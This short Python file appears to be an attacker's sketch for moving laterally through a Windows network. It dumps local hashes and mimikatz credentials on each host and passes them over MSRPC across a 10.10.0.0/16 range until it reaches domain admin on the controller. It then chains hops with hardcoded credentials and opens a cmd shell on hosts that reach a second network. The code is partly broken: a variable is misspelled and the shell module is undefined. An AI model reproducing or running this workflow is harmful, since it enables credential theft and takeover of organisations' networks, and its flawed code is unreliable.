import shell
from netaddr import IPRange

target = "10.10.54.77"
DC = "10.0.0.1"

def lateral(host):
	if not host:
		return
	local = host("hashdump")
	domain = host("mimikatz")
	for user,_,lm,ntml,_ in local:
		if host.msrpc(DC,user,ntlm):
			print "[+] domain admin found"
			exit()
		for ip in IPRange("10.10.0.0/16"):
			lateral(host.msrpc(ip,user,ntlm))
	for user,password in domain:
		if host.msrpc(DC,user,password):
			print "[+] domain admin found"
			exit()

lateral(shell.msrpc(target))


host = shell.msrpc("10.10.5.90","admin","password").msrpc("10.10.7.89","corp/ivanov.ii","p@ssw0rd")
host("ipconfig")


for host in shell.msrpc("10.10.8.0/24"):
	if "172.16.0." in host("ipconfig"):
		host("cmd")
